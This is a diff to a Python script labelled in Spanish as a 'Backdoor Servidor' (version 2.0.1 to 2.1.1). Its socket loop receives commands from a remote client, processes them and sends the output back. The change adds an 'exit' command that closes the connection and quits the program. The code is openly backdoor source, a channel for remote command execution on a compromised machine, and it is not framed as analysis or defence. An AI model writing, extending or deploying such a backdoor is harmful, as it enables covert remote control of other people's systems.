@@ -1,7 +1,7 @@
 """
 Uso: Backdoor Servidor
 Creado: Andrés Hernández Mata
-Version: 2.0.1
+Version: 2.1.1
 Python: 3.9.1
 Fecha: 08 Abril 2020
 """
@@ -26,8 +26,12 @@ while True:
     print("[+] Direccion ", direccion)          
     while True:        
         comando = cliente.recv(bufferSize)
-        if comando == b"":
-            break
+        if comando == b"exit":
+            cliente.close()
+            print("[+] Cerrando Conexion...")            
+            print("[+] Saliendo...")
+            print("[-] Bye...")            
+            sys.exit()                       
         else:
             print("[+] Recibiendo Comando...") 
             comando = comando.decode()    
@@ -38,7 +42,6 @@ while True:
             salida = salida.encode()
             cliente.send(salida)    
             print("\n")
-            print("[+] Esperando...")
-    cliente.close()
+            print("[+] Esperando...")    
 
 
